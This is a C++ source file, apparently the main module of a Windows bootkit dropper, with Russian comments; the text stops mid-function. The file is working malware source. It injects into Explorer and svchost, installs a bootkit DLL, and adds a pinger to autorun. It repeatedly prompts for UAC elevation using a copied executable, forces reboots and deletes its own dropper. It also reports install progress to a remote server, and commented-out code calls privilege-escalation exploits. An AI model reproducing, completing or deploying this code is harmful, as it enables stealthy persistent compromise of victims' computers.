#include <windows.h>
#include <tlhelp32.h> 

#include "GetApi.h"
#include "BotCore.h"
#include "Memory.h"
#include "Strings.h"
#include "DllLoader.h"

#include "Utils.h"

#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Unhook.h"
#include "Loader.h"
#include "Grabber.h"

#include "Crypt.h"


#include "ntdll.h"

#include "BotEvents.h"
#include "BotHTTP.h"
#include "Task.h"
#include "md5.h"
#include "inject.h"


#include "exploit\exploit.h"
#include "exploit\spooler.h"
#include "exploit\com\com_elevation.h"
#include "PeFile.h"
#include "shlobj.h"
#include "svc_fuckup.h"

#include "reboot.h"

#include "BotDebug.h"
#include "DbgRptBootkit.h"
#include "DbgRpt.h"

namespace BootkitDll
{
	#include "setupdll.cpp"
}

namespace BotPingExe
{
	#include "WhiteJoeRebootPing.cpp"
}

#pragma comment(linker, "/ENTRY:MyMain" )

#define ARGV_UAC_RUN	"-UAC"

PCHAR Manifest[] ={ "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>",
					"<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">",
					"	<trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">",
					"		<security>",
					"			<requestedPrivileges>",
					"				<requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\"></requestedExecutionLevel>",
					"			</requestedPrivileges>",
					"		</security>",
					"	</trustInfo>",
					"</assembly>"
				  };

#ifndef DEBUGCONFIG
char DROPER_NAME_PREFIX[] = "__DROPER_NAME_PREFIX__";
char TARGET_PLATFORM[] = "__TARGET_PLATFORM__";
char SVC_FUCKUP_ENABLED[] = "__SVC_FUCKUP_ENABLED__";
#else
char DROPER_NAME_PREFIX[] = "test";
char TARGET_PLATFORM[] = "target-xp";
char SVC_FUCKUP_ENABLED[] = "0";
#endif

CHAR PathBkFile[MAX_PATH]; 
CHAR FileToDelete[MAX_PATH]; //путь для удаления первоначального файла бота


// Влияет на то, будет ли вызван ExitProcess для
// процесса, в котором вызвана ExplorerRoutine.
DWORD dwExplorerSelf = 0; //если инжект был в собственный эксплорер

VOID GetPaths();

BOOL SaveManifest(PCHAR FileName)
{
	PCHAR manifest = STR::Alloc(1024);
	BOOL ret;

	manifest[0] = 0;
	for ( int i =0; i< sizeof(Manifest)/sizeof(Manifest[0]); ++i)
	{
		m_lstrcat(manifest,Manifest[i]);
		m_lstrcat(manifest,"\r\n");
	};

	ret = File::WriteBufferA(FileName,manifest,m_lstrlen(manifest));
	STR::Free(manifest);
	return ret;
};

DWORD WINAPI DeleteDropper(LPVOID) // убиваем процесс, стираем файл
{
	BOT::Initialize();
	DebugReportInit();
	PP_DPRINTF("DeleteDropper: started for '%s'", FileToDelete);
	LONG i = 1;
	
	PP_DPRINTF("DeleteDropper: Calling MoveEx...");
	pMoveFileExA(FileToDelete,NULL,MOVEFILE_DELAY_UNTIL_REBOOT);

	PP_DPRINTF("DeleteDropper: Starting delete cycle ...");
	while(i++)
	{
		if (pDeleteFileA( FileToDelete ))
			break;
		pSleep(1025*i);
	};
	
	PP_DPRINTF("DeleteDropper: Delete finished.");

	pExitThread(0);
	return 0;
}

char* GetNamePrefix()
{
	return STR::New(DROPER_NAME_PREFIX);
}

char* GetNameTargetPlatform()
{
	return STR::New(TARGET_PLATFORM);
}

char* GetSvcFuckupEnabled()
{
	return STR::New(SVC_FUCKUP_ENABLED);
}

DWORD TakePrivileges()
{
	DWORD ret = 0;
	OSVERSIONINFOEXA OSVer = {sizeof(OSVer), 0};


	return 1;	//выключили сплоеты

	//ret = FuckupSvc();	//выключили сплоеты
	//if (ret)
	//	OutputDebugStr("FuckupSvc ok.");
	//else
	//	OutputDebugStr("FuckupSvc failed.");
	//return ret;

	//if (! pGetVersionExA(&OSVer) )
	//	return FALSE;
	//
	//switch (OSVer.dwMajorVersion)
	//{
	//	case 5:			// Windows XP
	//	{
	//		if ( ! (ret = ExploitMS10_073()) )
	//			ret = ReplaceDotNetServices(FileToDelete);
	//		
	//		break;
	//	};
	//	case 6:			// Windows WIN 7 / Vista 
	//	{
	//		if ( OSVer.dwMinorVersion == 0 )
	//		{	
	//			if ( RunExeFromSystem(FileToDelete) )
	//				ret = 2;
	//			
	//		};

	//		if ( OSVer.dwMinorVersion == 1)
	//			ret = ExploitEUDC();

	//		break;
	//	};
	//};

	return ret;
};


DWORD WINAPI RebootThread(void* p)
{
	PP_DPRINTF("RebootThread: run MultiMethodReboot().");
	MultiMethodReboot();
	return 0;
}



DWORD WINAPI RebootNotifyThread(void* p)
{
	while (true)
	{
		PP_DPRINTF("RebootNotifyThread: pinging server...");

		//150_d таймер отсчета завершения ребута
		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("150_d"));

		PP_DPRINTF("RebootNotifyThread: sleeping 5 min");
		pSleep(5 * 60 * 1000);
	}
	return 0;
}

void AddRebootPingToAutorun()
{
	PP_DPRINTF("AddRebootPingToAutorun: started.");
	void* exeFile;
	DWORD size;
	bool neededDel;
	if( TMemoryDLL::DecodeDll( BotPingExe::data, size, exeFile, neededDel ) )
	{
		char* p = (char*) m_memmem( exeFile, size, "__PINGER_UID__", 14 );
		if( p )
		{
			m_lstrcpy( p, BOT_UID );
			AddToAutoRun( exeFile, size );
			if( neededDel ) MemFree(exeFile);
			PP_DPRINTF("AddRebootPingToAutorun: finished.");
		}
	}
}

void AddRebootPingDllToAutorun()
{
/*
	DWORD dll_body_size = 0;
	void* dll_body = NULL;

	PP_DPRINTF("AddRebootPingDllToAutorun: started.");
	
	dll_body = GetSectionData("REBOOT_PING_DLL", &dll_body_size);
	PP_RETURNIF1(dll_body == NULL);
	PP_RETURNIF1(dll_body_size == 0);

	HMEMORYMODULE dll = MemoryLoadLibrary(dll_body);

	PP_RETURNIF1(dll == NULL);

	typedef BOOL (WINAPI* InstallFunction)(const void* dll_body, DWORD dll_body_size);

	InstallFunction install = NULL;

	install = (InstallFunction)MemoryGetProcAddress(dll, "Install");

	PP_RETURNIF1(install == NULL);

	// 123_d начало вызова Install для установки ping dll
	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("123_d"));

	BOOL install_result = install(dll_body, dll_body_size);
	if (install_result)
	{
		// 124_d вызов Install для установки ping dll вернул TRUE
		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("124_d"));
	}

	PP_DPRINTF("AddRebootPingDllToAutorun: finished with install_result=%d.", install_result);
*/
}

void GetDriverUrl(char * UrlBuffer, DWORD UrlBufferSize)
{
	CHAR BotUid[200];
	
	m_memset(BotUid, 0, sizeof(BotUid));
	m_memset(UrlBuffer, 0, UrlBufferSize);

	GenerateUid(BotUid);

	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "cmd", "step");
	AddURLParam(Fields, "uid", BotUid);
	AddURLParam(Fields, "step", "170_dr"); //170_dr таймер драйвера

	PCHAR Params = Strings::GetText(Fields, "&");
	PCHAR URL = STR::New(3, PP_REPORT_URL, "?", Params);
	
	PP_DPRINTF("GetDriverUrl: url='%s':%u", URL, STR::Length(URL));

	PP_RETURNIF1(UrlBufferSize < (STR::Length(URL) - 1));

	m_lstrcpy(UrlBuffer, URL);

	STR::Free(URL);
	STR::Free(Params);
	Strings::Free(Fields);
}

bool SaveUrlForBootkitDriver()
{
	WCHAR  key_path[] = L"SOFTWARE\\Classes\\CLSID\\{8CB0A413-0585-4886-B110-004B3BCAA9A8}";
	CHAR   url[500];
	DWORD	 url_length = 0;
	HKEY   key;
	DWORD  opt = 0;

	GetDriverUrl(url, sizeof(url));

	DWORD key_created = (DWORD)pRegCreateKeyExW(HKEY_LOCAL_MACHINE, key_path, 0, NULL, 0, KEY_WRITE, NULL, &key, &opt);
	PP_RETURNIF2(key_created != ERROR_SUCCESS, false);

	// Сохраняем на всякий пожарный с 0 в конце
	DWORD url_value_set = (DWORD)pRegSetValueExW(key, L"ID", 0, REG_BINARY, (const BYTE*)&url[0], 
		(DWORD)plstrlenA(url));
	PP_RETURNIF2(url_value_set != ERROR_SUCCESS, false);

	PP_DPRINTF("SaveUrlForBootkit: Url key set (url=%s).", url);

	pRegCloseKey(key);
	return true;
}

bool SetupBootkit()
{
	ULONG ret  = -1;
	UnhookDlls();

	PP_DPRINTF("ExplorerStart: looking for setup dll...");

	TMemoryDLL BkImage(BootkitDll::data);
	
	if( BkImage.IsTrue() )
	{
		bool uid_saved = SaveUrlForBootkitDriver();
		PP_DPRINTF("ExplorerStart: UID saved for bootkit.(result=%d)", uid_saved);

		PP_DPRINTF("ExplorerStart: looking for setup function ....");
		ULONG (*BkInstall)(BOOL);
		if ( BkInstall = (ULONG(*)(BOOL))BkImage.GetProcAddress("BkInstall")  )
		{
			// 111_d - запуск установки
			PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("111_d"));

			PP_DPRINTF("ExplorerStart: setup function found 0x%X. Calling it.", BkInstall);
			ret = BkInstall(FALSE);
			PP_DPRINTF("ExplorerStart: setup function result = 0x%X", ret);

			if (ret == ERROR_SUCCESS)
			{
				//112_d установка успешна
				PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("112_d"));
			}

			PP_DPRINTF("ExplorerStart: doing DebugReportStep2");
			PP_DBGRPT_FUNCTION_CALL(DebugReportStep2(ret));
		}

		PP_DPRINTF("ExplorerStart: returning %d.", (ret == ERROR_SUCCESS));
		return (ret == ERROR_SUCCESS);
	}
	PP_DPRINTF("ExplorerStart: returning false.");
	return false;
}

DWORD WINAPI SetupBootkitInSvchost(LPVOID)
{
	BOT::Initialize();
	DebugReportInit();
	SetupBootkit();
	return 0;
}

// Ф-ция, которая после проверок вызывает события старта в процессе Explorer,
// что в свою очередь вызывает установку BkDll
BOOL ExplorerMain()
{
	BOOL ret = FALSE;
	bool BkInstalledSuccess = false;
	PP_DPRINTF("ExplorerMain: started");

	// Вызываем событие старта експлорера
	if ( (DWORD)pGetFileAttributesA(PathBkFile) == INVALID_FILE_ATTRIBUTES)
	{
		PP_DPRINTF("ExplorerMain: BkFile not exists. Runing ExplorerStart()");
		PP_DPRINTF("ExplorerStart: doing DebugReportStep1 on start.");
		PP_DBGRPT_FUNCTION_CALL(DebugReportStep1());

		PP_DPRINTF("ExplorerStart: doing DebugReportUpdateNtldrCheckSum on start.");
		PP_DBGRPT_FUNCTION_CALL(DebugReportUpdateNtldrCheckSum());

		PP_DPRINTF("ExplorerStart: doing sending system information.");
		PP_DBGRPT_FUNCTION_CALL(DebugReportCreateConfigReportAndSend());
	
		// 110_d - запуск ExplorerStart
		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("110_d"));
//		if ( SetupBootkit() )
		if( MegaJump(SetupBootkitInSvchost) )
		{
			pSleep(5000);
			PP_DPRINTF("ExplorerStart: add pinger to autorun...");
			AddRebootPingToAutorun();
			AddRebootPingDllToAutorun();
			ret = TRUE;
			BkInstalledSuccess = true;
			
			PP_DPRINTF("ExplorerMain: ExplorerStart()  finished successfuly. Saving 0x00000001 in '%s'",
				PathBkFile);

			// Записываем в BkFile 4 байта с единичкой.
			File::WriteBufferA(PathBkFile,&ret,sizeof(BOOL));
		}
	}
	else
	{
		PP_DPRINTF("ExplorerMain: BkFile exists.");
		ret = TRUE;
	};

	if ( ret )
	{
		// Если проверка находит файл Bk или возвращает успех при установке - 
		// создается файл в системном корне с 4 байтами адреса строки.
		// Этот файл проверяется ring3 ботом, который запустил дропер буткита.
		// При нахождении этого файла он будет пытатся удалить себя из автозапуска.

		PCHAR Path= STR::Alloc(MAX_PATH);
		PCHAR UID=STR::Alloc(120);

		pGetSystemDirectoryA(Path,MAX_PATH);
		GenerateUid(UID);
		Path[3]='\0';
		
		PCHAR Pref= STR::GetRightStr(UID,"0");
		m_lstrcat(Path, Pref);

		PP_DPRINTF("ExplorerMain: Bk installed. Creating file '%s'", Path);
		File::WriteBufferA(Path,&Path,sizeof(PCHAR));

		STR::Free(Pref);
		STR::Free(UID);
		STR::Free(Path);
	};

	if (BkInstalledSuccess)
	{
		DWORD thid = 0;
		PP_DPRINTF("ExplorerMain: starting reboot thread and reboot notify thread");
		pCreateThread(NULL, 0, RebootThread, NULL, 0, &thid);
		pCreateThread(NULL, 0, RebootNotifyThread, NULL, 0, &thid);
	}

	PP_DPRINTF("ExplorerMain: finished.");

	return ret;
}


// Ф-ция, которая вызывается при инжекте в другие процессы.
// Проверяет свои права и пробует их расширить для 
DWORD WINAPI ExplorerRoutine( LPVOID lpData )
{
	BOT::Initialize();
	DebugReportInit();
	// 
	//	Cоздадим отдельный поток для удаления так как дропер может удаляться больше минуты.
	//
	
	BOOL bRun = TRUE;
	BOOL bRet = FALSE;
	BOOL IsUsedExploit = FALSE;
	OSVERSIONINFOEXA OSVer;
	m_memset( &OSVer, 0, sizeof(OSVer) );
	OSVer.dwOSVersionInfoSize = sizeof(OSVer) ;

	UnhookDlls();

	PP_DPRINTF("ExplorerRoutine: started");

	if (! IsUserAdmin() )
	{
		PP_DPRINTF("ExplorerRoutine: user is not admin. Trying to take privileges.");
		switch ( TakePrivileges() )
		{
			case 0:
			case 2:
				bRun = FALSE;
			break;	
		};

		PP_DPRINTF("ExplorerRoutine: TakePrivile result=%d", bRun);
		IsUsedExploit = TRUE; // По идее это всегда TRUE
	};		

	if ( bRun )
	{
		PP_DPRINTF("ExplorerRoutine: run ExplorerMain");
		bRet = ExplorerMain();
		PP_DPRINTF("ExplorerRoutine: ExplorerMain() result=%d", bRet);
	}
	
	/*		Если есть права Админа но мы не юзали сплоеты и инстал не удался, юзаем сплоеты и снова делаем инстал		*/
	if ( (bRet == FALSE) && (bRun == TRUE) && (IsUsedExploit == FALSE) )
	{
		PP_DPRINTF("ExplorerRoutine: Trying again to take privileges");

		IsUsedExploit = TRUE;
		switch ( TakePrivileges() )
		{
			case 0:
			case 2:
				bRun = FALSE;
			break;
		};
		if ( bRun )
		{
			PP_DPRINTF("ExplorerRoutine: Second call of ExplorerMain");
			bRet = ExplorerMain();
			PP_DPRINTF("ExplorerRoutine: Second ExplorerMain() result=%d", bRet);
		}
	};

	pGetVersionExA(&OSVer);
	
	/*		Выкидываем длл на диск и юзаем  сплойт спуллера, только XP		*/
/*
	if ( (! bRet) && (PEFile::IsDll((PVOID)GetImageBase()) == FALSE) && (OSVer.dwMajorVersion == 5))
	{
		PP_DPRINTF("ExplorerRoutine: Trying to use XP spooler exploit");

		DWORD DropSize = 0;	
		PVOID DropImage  = GetSectionData("DROPER_DLL",&DropSize);
		if ( DropImage && DropSize)
		{
			PCHAR DropFile = File::GetTempNameA();
			File::WriteBufferA(DropFile,DropImage,DropSize);
			SpoolerBypass(DropFile);
			STR::Free(DropFile);
		};
	};
*/

	/*		Запуск много раз копии дропера с прошением повышенных прав.		*/
	if (  bRet == FALSE )
	{
		PP_DPRINTF("ExplorerRoutine: start UAC asking cycle");

		PCHAR tmpexe,dir,file ;
		PCHAR tmp_manifest;
		PCHAR NamePrefix = GetNamePrefix();
		
		if ( NamePrefix )
		do 
		{

			tmpexe = File::GetTempNameA();
			tmp_manifest = STR::Alloc(MAX_PATH+1);
			
			dir = (tmpexe != NULL)? File::ExtractFilePathA(tmpexe) : NULL ;
			file = (tmpexe != NULL)? File::ExtractFileNameA(tmpexe, true) : NULL ;
		
			if (  tmp_manifest && dir && file)
			{
				STR::Free(tmpexe);
				tmpexe = STR::New(5,dir,"\\",NamePrefix,file,".exe");
				if ( ! tmpexe )
					return 0;
				m_lstrcpy(tmp_manifest,tmpexe);
				m_lstrcat(tmp_manifest,".manifest");
			};

			if ( tmpexe && tmp_manifest )
			if ( pCopyFileA(FileToDelete,tmpexe,FALSE) && SaveManifest(tmp_manifest) )
			{
				
				DWORD dwCode = -1;
				SHELLEXECUTEINFOA ExecInfo;
				
				m_lstrcpy(tmp_manifest,tmpexe);
				m_lstrcat(tmp_manifest,"   ");
				m_lstrcat(tmp_manifest,ARGV_UAC_RUN);

				ExecInfo.cbSize = sizeof(ExecInfo);
				ExecInfo.lpFile = tmpexe;
				ExecInfo.lpParameters = tmp_manifest;
				ExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;

				for ( int i = 0; i < 10; ++i )
				{
					PP_DPRINTF("ExplorerRoutine: asking UAC for '%s'", tmp_manifest);

					if ( pShellExecuteExA(&ExecInfo) == FALSE )
						break;

					pWaitForSingleObject(ExecInfo.hProcess,INFINITE);
					pGetExitCodeProcess(ExecInfo.hProcess,&dwCode);
					if ( dwCode == 0  )
					{
						PP_DPRINTF("ExplorerRoutine: UAC allowed for '%s'", tmp_manifest);
						break;
					}
				}
			};
			
			if ( tmpexe )
				STR::Free(tmpexe);
			if ( tmp_manifest )
				STR::Free(tmp_manifest);
			if ( dir )
				STR::Free(dir);
			if ( file )
				STR::Free(file);
		}
		while ( ( (DWORD)pGetFileAttributesA(PathBkFile) == INVALID_FILE_ATTRIBUTES) );	//	end do, цикл пока не появится Файл буткита

		if ( NamePrefix )
			STR::Free(NamePrefix);
	};

	/*		Если инстал был не удачный снова пробуем вдруг повезет*/
	if ( bRet  == FALSE)
	{
		PP_DPRINTF("ExplorerRoutine: Third call of ExplorerMain");
		bRet = ExplorerMain();
		PP_DPRINTF("ExplorerRoutine: Third ExplorerMain() result=%d", bRet);
	}

	/*	 Удаляем дропер	*/
	PP_DPRINTF("ExplorerRoutine: Start to delete droper");
	pCloseHandle(StartThread(DeleteDropper,NULL));
	
	if ( dwExplorerSelf )
	{
		PP_DPRINTF("ExplorerRoutine: dwExplorerSelf is true. Call ExitProcess()");
		pExitProcess(0);
	}

	return 0;
}

//
// получаем путь к дроперу для его удаления.
//
VOID GetPaths()
{
	BOOL bUsed;
	PWCHAR buf =  (PWCHAR)MemAlloc(sizeof(WCHAR)*MAX_PATH);
	
	if ( buf )
	{

		pGetModuleFileNameW(NULL,buf,MAX_PATH-1);
		pWideCharToMultiByte(CP_ACP,0,buf,-1,FileToDelete,sizeof(FileToDelete)-1,NULL,&bUsed);
		PP_DPRINTF("GetPaths: FileToDelete='%s'", FileToDelete);

		buf[0]= 0;
		pSHGetSpecialFolderPathW(NULL,buf,CSIDL_COMMON_APPDATA ,TRUE);
		pWideCharToMultiByte(CP_ACP,0,buf,-1,PathBkFile,sizeof(PathBkFile)-1,NULL,&bUsed);
		MemFree(buf);
		m_lstrcat(PathBkFile,"\\");
		m_lstrcat(PathBkFile,MakeMachineID());

		PP_DPRINTF("GetPaths: PathBkFile='%s'",PathBkFile);
	};
};

enum TargetPlatform
{
	TargetPlatform_XP = 1,
	TargetPlatform_Vista,
	TargetPlatform_Seven,

	TargetPlatform_All
};

TargetPlatform GetTargetPlatform()
{
	PCHAR TargetName = GetNameTargetPlatform();

	if ( TargetName )
	{
		if (m_lstrcmp(TargetName, "target-xp") == 0) return TargetPlatform_XP;
		if (m_lstrcmp(TargetName, "target-vista") == 0) return TargetPlatform_Vista;
		if (m_lstrcmp(TargetName, "target-seven") == 0) return TargetPlatform_Seven;

		STR::Free(TargetName);
	}
	return TargetPlatform_All;
}

bool CurrentPlatformAllowedByTargetSpecifier()
{
	TargetPlatform		target = GetTargetPlatform();
	OSVERSIONINFOEXA	ver;

	// Спецификация указывает на все платформы.
	// Значит сразу возвращаем ОК.
	if (target == TargetPlatform_All) return true;

	// Определения платформы.
	// Ошибка при получении информации считается поводом отклонить запуск.
	m_memset(&ver, 0, sizeof(ver));
	ver.dwOSVersionInfoSize = sizeof(ver);
	if (!pGetVersionExA(&ver) ) return false;

	struct 
	{
		TargetPlatform target;
		DWORD          os_version_major;
		DWORD          os_version_minor;
	}	target_table[] = 
	{
		{ TargetPlatform_XP   , 5, 1 },
		{ TargetPlatform_Vista, 6, 0 },
		{ TargetPlatform_Seven, 6, 1 }
	};

	for (size_t i = 0; i < ARRAYSIZE(target_table); i++)
	{
		if ((target == target_table[i].target) &&
			(ver.dwMajorVersion == target_table[i].os_version_major) &&
			(ver.dwMinorVersion == target_table[i].os_version_minor)
			)
		{
			return true;
		}
	}

	return false;
}

void InitSuicide()
{
	PP_DPRINTF("InitSuicide: jumping to explorer with delete task.");
	
	dwExplorerSelf = 1;
	if ( ! InjectIntoExplorer ( DeleteDropper ) )
	{
		PP_DPRINTF("InitSuicide: jumping to explorer failed. Jump to svchost with delete task.");
		
		dwExplorerSelf = 0;
		JmpToSvchost( DeleteDropper );
	}
	PP_DPRINTF("InitSuicide: finished.");
}

bool SvcFuckupEnabled()
{
	PCHAR enabled_string = GetSvcFuckupEnabled();

	if (enabled_string[0] == '1')
	{
		STR::Free(enabled_string);
		return true;
	}
	return false;
}

// Callback ф-ция, которая вызывается когда стартует FuckupService
void SvcFuckupServiceMain()
{
	PP_DPRINTF("SvcFuckupServiceMain: started.");
	if (ExplorerMain() == FALSE) 
	{
		PP_DPRINTF("SvcFuckupServiceMain: ExplorerMain failed.");
		InitSuicide();
	}
	PP_DPRINTF("SvcFuckupServiceMain: finished.");
}

void SvcFuckupServiceMainTest()
{
	PP_DPRINTF("SvcFuckupServiceMainTest: started ");
	DWORD i = 100;
	while ((i--) > 0)
	{
		PP_DPRINTF("SvcFuckupServiceMainTest: test sleep 1 sec (%d)", i);
		pSleep(1000);
	}
	PP_DPRINTF("SvcFuckupServiceMainTest: finished");
}


//void TestStepNotifications()
//{
//	PP_DBGRPT_FUNCTION_CALL(DebugReportStep1());
//	PP_DBGRPT_FUNCTION_CALL(DebugReportStep2(0));
//	PP_DBGRPT_FUNCTION_CALL(DebugReportStep2(0xC001782));
//	PP_DBGRPT_FUNCTION_CALL(DebugReportStep3());
//	
//	PP_DBGRPT_FUNCTION_CALL(DebugReportStep5());
//	PP_DBGRPT_FUNCTION_CALL(DebugReportStep6());
//}

//void User32SprintfA(char* buffer, const char* format, ...)
//{
//  va_list ptr;
//  va_start(ptr, format);
//  pwvsprintfA(buffer, format, ptr);
//  va_end(ptr);
//}
//
//
//void GenUid(char* Buffer, DWORD BufferSize, const char* Prefix)
//{
//	GUID g;
//	CoCreateGuid(&g);
//
//	m_memset(Buffer, 0, BufferSize);
//
//	User32SprintfA(Buffer, "%s0%08X%04X%04X%02X%02X%02X%02X%02X%02X%02X%02X",
//		Prefix, 
//		g.Data1, 
//		g.Data2, 
//		g.Data3,
//		g.Data4[0], 
//		g.Data4[1], 
//		g.Data4[2], 
//		g.Data4[3], 
//		g.Data4[4], 
//		g.Data4[5], 
//		g.Data4[6], 
//		g.Data4[7]);
//}

//void TestDebugReportStep1(const char* uid, const char* os, const char* cs01)
//{
//	PStrings Fields = Strings::Create();
//	AddURLParam(Fields, "cmd", "beforerbt");
//	AddURLParam(Fields, "uid", (PCHAR)uid);
//	AddURLParam(Fields, "os", (PCHAR)os);
//
//	if (cs01 != NULL)
//	{
//		AddURLParam(Fields, "cs01", (PCHAR)cs01);
//	}
//
//	PCHAR Params = Strings::GetText(Fields, "&");
//	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);
//
//	PP_DPRINTF("DebugReportStep1: sending url='%s'", URL);
//
//	HTTP::Get(URL, NULL, NULL);
//
//	STR::Free(URL);
//	STR::Free(Params);
//	Strings::Free(Fields);
//}
//

//void TestDebugReportStepByName(const char* Uid, const char* StepName)
//{
//	PStrings Fields = Strings::Create();
//	AddURLParam(Fields, "cmd", "step");
//	AddURLParam(Fields, "uid", (PCHAR)Uid);
//	AddURLParam(Fields, "step", (PCHAR)StepName);
//
//	PCHAR Params = Strings::GetText(Fields, "&");
//	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);
//	
//	PP_DPRINTF("TestDebugReportStepByName: sending url='%s'", URL);
//
//	HTTP::Get(URL, NULL, NULL);
//
//	STR::Free(URL);
//	STR::Free(Params);
//	Strings::Free(Fields);
//}

//void TestNewReport()
//{
//	struct 
//	{
//		const char* cs01;
//
//		DWORD count_cs1;
//
//		DWORD count_111_d;
//		DWORD count_122_d;
//		DWORD count_160_dp;
//		DWORD count_305_ld;
//
//	} cs_table[] = 
//	{
//		{"AAAAAFFFFF0000000000000000000011", 70, 70, 60, 50, 40},
//		{"AAAAAFFFFF0000000000000000000022", 65, 65, 55, 45, 35},
//		{"AAAAAFFFFF0000000000000000000033", 60, 60, 50, 40, 30},
//		{"AAAAAFFFFF0000000000000000000044", 55, 55, 45, 35, 25},
//		{"AAAAAFFFFF0000000000000000000055", 50, 50, 40, 30, 20},
//	};
//
//	for (size_t i = 0; i < ARRAYSIZE(cs_table); i++)
//	{
//		for (size_t j = 0; j < cs_table[i].count_cs1; j++)
//		{
//			char uid[100] = {0};
//			GenUid(uid, 100, "trtrtrtr");
//
//			TestDebugReportStep1(uid, "XP_3_32", cs_table[i].cs01);
//
//			if (cs_table[i].count_111_d > 0) 
//			{
//				TestDebugReportStepByName(uid, "111_d");
//				cs_table[i].count_111_d--;
//			}
//
//			if (cs_table[i].count_122_d > 0) 
//			{
//				TestDebugReportStepByName(uid, "122_d");
//				cs_table[i].count_122_d--;
//			}
//
//			if (cs_table[i].count_160_dp > 0) 
//			{
//				TestDebugReportStepByName(uid, "160_dp");
//				cs_table[i].count_160_dp--;
//			}
//
//			if (cs_table[i].count_305_ld > 0) 
//			{
//				TestDebugReportStepByName(uid, "305_ld");
//				cs_table[i].count_305_ld--;
//			}
//		}
//	}
//}


//
//void TestNewReport()
//{
//	char*  uids[100];
//
//	struct 
//	{
//		const char* step_name;
//		DWORD count;
//
//	} steps[] = 
//	{
//		{"100_d", 50},
//		{"120_d", 45},
//		{"130_d", 40},
//		{"140_d", 35},
//		{"150_d", 30},
//		{"201_dp", 25},
//		{"301_ld", 20},
//		{"302_ld", 20},
//		{"303_ld", 15},
//		{"401_pl", 10},
//		{"402_pl", 10},
//		{"403_pl", 10},
//	};
//
//	for (size_t i = 0; i < ARRAYSIZE(uids); i++)
//	{
//		uids[i] = STR::Alloc(100);
//		GenUid(uids[i], 100, "testuid");
//	}
//
//	for (size_t i = 0; i < ARRAYSIZE(steps); i++)
//	{
//		const char* step = steps[i].step_name;
//		DWORD count = steps[i].count;
//
//		for (size_t j=0;j < count; j++)
//		{
//			TestDebugReportStepByName(uids[j], step);
//		}
//	}
//
//
//}
//void TestWriteLineToFile(const CHAR* buffer, const CHAR* path)
//{
//	HANDLE f = CreateFileA(path, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, 0, NULL);
//	if (f != INVALID_HANDLE_VALUE)
//	{
//		pSetFilePointer(f, 0, 0, FILE_END);
//		DWORD length = (DWORD)plstrlenA(buffer);
//		DWORD written = 0;
//		pWriteFile(f, buffer, length, &written, NULL);
//		pWriteFile(f, "\r\n", 2, &written, NULL);
//		pCloseHandle(f);
//	}
//}
//
//void TestDieMachineReport()
//{
//	//DebugReportCreateConfigReportAndSend();
//
//	const char * root_dir = "E:\\tmp\\1\\";
//	
//	struct 
//	{
//		const char* step_name;
//		DWORD count;
//
//	} steps[] = 
//	{
//		{"111_d",  50},
//		{"112_d",  45},
//		{"160_dp", 25},
//		{"304_ld", 20},
//	};
//
//	struct
//	{
//		char*  uid;
//		BYTE   stepset[ARRAYSIZE(steps)];
//	} uids[200];
//
//	for (size_t i = 0; i < 55; i++)
//	{
//		uids[i].uid = STR::Alloc(100);
//		GenUid(uids[i].uid, 100, "allordie");
//		m_memset(uids[i].stepset, 0, sizeof(uids[i].stepset));
//
//		char path[MAX_PATH];
//		char* uid = uids[i].uid;
//
//		m_memset(path, 0, sizeof(path));
//		m_lstrcat(path, root_dir);
//		m_lstrcat(path, uid);
//		m_lstrcat(path, ".txt");
//
//		File::WriteBufferA(path, uid, m_lstrlen(uid));
//		DebugReportSendSysInfo(uid, path);
//	}
//
//	for (size_t i = 0; i < ARRAYSIZE(steps); i++)
//	{
//		const char* step = steps[i].step_name;
//		DWORD count = steps[i].count;
//
//		for (size_t j=0;j < count; j++)
//		{
//			uids[j].stepset[i] = 1;
//			TestDebugReportStepByName(uids[j].uid, step);
//		}
//	}
//
//	for (size_t i = 0; i < 55; i++)
//	{
//		char line[500];
//		User32SprintfA(line, "%s:%d:%d:%d:%d", 
//			uids[i].uid, 
//			uids[i].stepset[0],
//			uids[i].stepset[1],
//			uids[i].stepset[2],
//			uids[i].stepset[3]
//			);
//
//		TestWriteLineToFile(line, "e:\\tmp\\1\\_all_stat");
//		if (uids[i].stepset[0] != 0 && 
//			uids[i].stepset[1] != 0 && 
//			uids[i].stepset[2] == 0 && 
//			uids[i].stepset[3] == 0
//			)
//		{
//			TestWriteLineToFile(uids[i].uid, "e:\\tmp\\1\\_1E_2E_3Ne_4NE");
//		}
//
//		if (uids[i].stepset[0] != 0 &&
//			uids[i].stepset[1] != 0 &&
//			uids[i].stepset[2] == 0)
//		{
//			TestWriteLineToFile(uids[i].uid, "e:\\tmp\\1\\_1E_2E_3Ne");
//		}
//	}
//}

void WaitAndExitProcess(DWORD exit_code)
{
	pSleep(3 * 1000);
	pExitProcess(exit_code);
}

//namespace PINGER
//{
//	#include "d:\GSVSoft\Projects\Agents\Builds\BootkitDropper\WhiteJoeRebootPing.cpp"
//}


int APIENTRY MyMain(int argc, char** argv)
{

	//TestStepNotifications();
	//MultiMethodReboot();
	//return 0;
	//PP_DPRINTF("MyMain: started");
	//if ( IsUserLocalSystem() )
	//{
	//	PP_DPRINTF("MyMain: current user is LocalSystem.");
	//	SvcFuckupRunAsService(SvcFuckupServiceMainTest);
	//}
	//else
	//{
	//	PP_DPRINTF("MyMain: current user is NOT LocalSystem.");

	//	if ( m_strstr((PCHAR)pGetCommandLineA(),"-install") )
	//	{
	//		PP_DPRINTF("MyMain: '-install' param specified. Run SvcFuckup.");
	//		bool fuckup_result = SvcFuckupRun();
	//		PP_DPRINTF("MyMain: SvcFuckupRun() finished with result=%d.", fuckup_result);
	//	}
	//}
	//PP_DPRINTF("MyMain: finished");
	//return 0;

